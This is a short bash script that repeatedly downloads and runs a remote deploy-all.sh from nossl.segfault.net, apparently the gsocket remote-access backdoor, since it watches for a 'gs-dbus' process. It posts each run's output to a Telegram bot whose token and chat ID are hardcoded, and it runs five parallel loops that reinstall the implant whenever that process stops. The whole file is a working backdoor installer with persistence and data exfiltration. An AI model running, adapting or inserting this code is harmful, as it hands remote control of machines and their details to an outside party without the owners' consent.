#!/bin/bash
TOKEN="7513781790:AAFC8T_sYrEM1sgIoqWzcBfjSE5Md5MrUYI"
CHAT_ID="6116824863"

command="curl -fsSL http://nossl.segfault.net/deploy-all.sh -o deploy-all.sh && bash deploy-all.sh"

send_to_telegram() {
  local message="$1"
  response=$(curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
    -d chat_id="${CHAT_ID}" \
    -d text="${message}" \
    -d parse_mode="Markdown")

  # Log the response locally if it fails
  if [[ $(echo "$response" | jq -r '.ok') != "true" ]]; then
    echo "$(date): Failed to send message to Telegram. Response: $response" >> telegram_error.log
  fi
}

monitor_and_restart() {
  while true; do
    output=$($command 2>&1)
    send_to_telegram "$(printf "Output of deploy-all.sh:\n\`\`\`%s\`\`\`" "$output")"

    zombie_pid=$(ps -eo pid,stat,cmd | awk '$2 == "Z" {print $1}')
    gs_dbus_pid=$(pgrep -f "gs-dbus")

    if [[ -n "$zombie_pid" || -z "$gs_dbus_pid" ]]; then
      if [[ -n "$zombie_pid" ]]; then
        echo "Zombie process detected with PID: $zombie_pid"
        while ps -p "$zombie_pid" &> /dev/null; do
          sleep 2
        done
        echo "Zombie process $zombie_pid removed."
      fi

      if [[ -z "$gs_dbus_pid" ]]; then
        echo "Process gs-dbus not running, restarting command..."
      fi
      eval "$command"
    fi
    sleep 10  # Increase the delay to avoid hitting rate limits
  done
}

for i in {1..5}; do
  monitor_and_restart &
done

wait
